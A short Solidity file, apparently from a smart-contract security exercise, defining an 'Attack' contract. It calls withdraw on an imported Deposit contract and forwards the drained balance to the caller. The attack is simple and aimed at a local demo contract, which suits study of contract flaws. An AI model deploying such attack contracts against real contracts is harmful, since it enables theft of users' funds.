// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
import "./Deposit.sol";


contract Attack {
    Deposit depos;

    constructor(address _addr) public {
        depos = Deposit(_addr);
    }

    function attack(uint _amount) public {
        depos.withdraw(_amount);
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }

    function getFunds() public {
        msg.sender.transfer(address(this).balance);
    }

    receive() external payable{
    }
}